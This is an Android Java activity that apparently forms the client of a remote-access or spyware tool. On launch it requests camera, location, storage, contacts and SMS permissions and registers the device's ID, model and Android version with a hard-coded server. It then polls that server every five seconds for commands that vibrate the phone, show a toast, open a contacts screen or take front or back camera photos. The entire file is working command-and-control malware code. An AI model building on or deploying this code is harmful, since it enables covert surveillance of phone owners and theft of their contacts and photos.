package net.kashif;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Vibrator;
import android.view.View;
import android.widget.*;
import java.io.*;
import java.net.*;
import java.util.*;
import org.json.JSONObject;

public class MainActivity extends Activity {
    private static final String SERVER = "http://10.0.54.47:5000";
    private String devId;
    private boolean polling = true;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);
        devId = UUID.randomUUID().toString();

        requestPermissions(new String[]{
            Manifest.permission.CAMERA,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS
        }, 100);

        registerDevice();
        startPolling();
    }

    private void registerDevice() {
        new Thread(new Runnable() {
            public void run() {
                try {
                    JSONObject j = new JSONObject();
                    j.put("id", devId);
                    j.put("model", Build.MODEL);
                    j.put("android", Build.VERSION.RELEASE);
                    sendReq("/api/register", j.toString());
                } catch (Exception e) {}
            }
        }).start();
    }

    private void startPolling() {
        new Thread(new Runnable() {
            public void run() {
                while (polling) {
                    try {
                        URL url = new URL(SERVER + "/api/commands/" + devId);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        if (conn.getResponseCode() == 200) {
                            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                            StringBuilder sb = new StringBuilder();
                            String line; 
                            while ((line = br.readLine()) != null) sb.append(line);
                            JSONObject res = new JSONObject(sb.toString());
                            if (!res.isNull("cmd")) {
                                executeCommand(res.getString("cmd"));
                            }
                        }
                        Thread.sleep(5000);
                    } catch (Exception e) {}
                }
            }
        }).start();
    }

    private void executeCommand(final String cmd) {
        runOnUiThread(new Runnable() {
            public void run() {
                if (cmd.equals("vibrate")) {
                    Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                    if (v != null) v.vibrate(1000);
                } else if (cmd.equals("toast")) {
                    Toast.makeText(MainActivity.this, "تم استلام الأمر!", Toast.LENGTH_LONG).show();
                } else if (cmd.equals("get_contacts")) {
                    startActivity(new Intent(MainActivity.this, ContactsActivity.class));
                } else if (cmd.equals("take_photo") || cmd.equals("take_photo_back")) {
                    Intent i = new Intent(MainActivity.this, CameraActivity.class);
                    i.putExtra("camera", cmd.equals("take_photo") ? "front" : "back");
                    startActivity(i);
                }
            }
        });
    }

    private void sendReq(String path, String json) throws Exception {
        URL url = new URL(SERVER + path);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        OutputStream os = conn.getOutputStream();
        os.write(json.getBytes("UTF-8"));
        os.flush(); 
        os.close();
        conn.getResponseCode();
    }
}
